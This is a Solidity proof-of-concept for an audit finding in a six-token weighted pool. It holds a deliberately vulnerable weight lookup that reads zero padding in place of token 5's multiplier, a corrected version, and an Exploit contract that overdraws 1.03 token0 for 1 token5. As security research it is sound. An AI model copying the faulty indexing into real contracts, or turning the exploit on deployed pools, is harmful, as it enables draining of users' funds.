// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  QuantAMMWeightedPool (Cyfrin, 2024-12-17)
    Six-token weights arrive as [w1..w6, m1..m6]. The second slot stores
    multipliers at lane i+4. _calculateCurrentBlockWeight reads
    packedIndex + (nTokens-4), which is the zero padding for token 5.
    A 1 ether swap of token 5 into token 0 pays 1.03 token0 instead of 1.00.
*/

contract SwapToken {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract WeightedPool {
    uint256 public constant ELAPSED = 5;
    uint256 public totalTokens = 6;
    int256[8] public slot0;
    int256[8] public slot1;
    SwapToken public immutable token0;
    SwapToken public immutable token5;

    constructor(SwapToken _token0, SwapToken _token5) {
        token0 = _token0;
        token5 = _token5;
    }

    function setWeights(int256[] memory weights) external {
        uint256 tokenLength = weights.length / 2;
        for (uint256 i; i < 4;) {
            slot0[i] = weights[i];
            slot0[i + 4] = weights[i + tokenLength];
            unchecked {
                i++;
            }
        }
        uint256 moreThan4Tokens = tokenLength - 4;
        for (uint256 i = 0; i < moreThan4Tokens;) {
            uint256 i4 = i + 4;
            slot1[i] = weights[i4];
            slot1[i4] = weights[i4 + tokenLength];
            unchecked {
                i++;
            }
        }
    }

    function currentWeight(uint256 tokenIndex) public view returns (int256) {
        uint256 packedIndex = tokenIndex;
        uint256 tokensInTokenWeights = 4;
        int256 base;
        int256 blockMultiplier;
        if (tokenIndex > 4) {
            packedIndex = tokenIndex - 4;
            tokensInTokenWeights = totalTokens - 4;
            base = slot1[packedIndex];
            // @> VULN: packedIndex + (nTokens - 4) reads the zero padding, not the multiplier stored at lane 4 + i
            blockMultiplier = slot1[packedIndex + tokensInTokenWeights];
        } else {
            base = slot0[packedIndex];
            blockMultiplier = slot0[packedIndex + tokensInTokenWeights];
        }
        return base + blockMultiplier * int256(ELAPSED);
    }

    function onSwap(uint256 indexIn, uint256 indexOut, uint256 amountGiven) external returns (uint256 amountOut) {
        int256 wIn = currentWeight(indexIn);
        int256 wOut = currentWeight(indexOut);
        amountOut = amountGiven * uint256(wOut) / uint256(wIn);
        require(token0.transfer(msg.sender, amountOut), "out");
    }
}

contract WeightedPoolFixed {
    uint256 public constant ELAPSED = 5;
    int256[8] public slot0;
    int256[8] public slot1;
    SwapToken public immutable token0;

    constructor(SwapToken _token0) {
        token0 = _token0;
    }

    function setWeights(int256[] memory weights) external {
        uint256 tokenLength = weights.length / 2;
        for (uint256 i; i < 4;) {
            slot0[i] = weights[i];
            slot0[i + 4] = weights[i + tokenLength];
            unchecked {
                i++;
            }
        }
        uint256 moreThan4Tokens = tokenLength - 4;
        for (uint256 i = 0; i < moreThan4Tokens;) {
            uint256 i4 = i + 4;
            slot1[i] = weights[i4];
            slot1[4 + i] = weights[i4 + tokenLength];
            unchecked {
                i++;
            }
        }
    }

    function currentWeight(uint256 tokenIndex) public view returns (int256) {
        if (tokenIndex > 4) {
            uint256 packedIndex = tokenIndex - 4;
            return slot1[packedIndex] + slot1[4 + packedIndex] * int256(ELAPSED);
        }
        return slot0[tokenIndex] + slot0[tokenIndex + 4] * int256(ELAPSED);
    }

    function onSwap(uint256 indexIn, uint256 indexOut, uint256 amountGiven) external returns (uint256 amountOut) {
        amountOut = amountGiven * uint256(currentWeight(indexOut)) / uint256(currentWeight(indexIn));
        require(token0.transfer(msg.sender, amountOut), "out");
    }
}

contract Exploit {
    SwapToken public token0;
    SwapToken public token5;
    WeightedPool public pool;
    uint256 public received;

    constructor() {
        token0 = new SwapToken("T0");
        token5 = new SwapToken("T5");
        pool = new WeightedPool(token0, token5);
        token0.mint(address(pool), 10 ether);
        token5.mint(address(this), 1 ether);
    }

    function run() external {
        int256 w = int256(1e18) / 6;
        int256 m = 0.001e18;
        int256[] memory weights = new int256[](12);
        for (uint256 i; i < 6; i++) {
            weights[i] = w;
            weights[i + 6] = m;
        }
        pool.setWeights(weights);
        require(token5.transfer(address(pool), 1 ether), "pay in");
        received = pool.onSwap(5, 0, 1 ether);
        require(pool.currentWeight(5) == w, "token5 multiplier dropped");
        require(pool.currentWeight(0) == w + m * 5, "token0 multiplier applied");
        require(received == 1.03 ether, "overpaid out");
        require(token0.balanceOf(address(this)) == 1.03 ether, "received");
    }
}
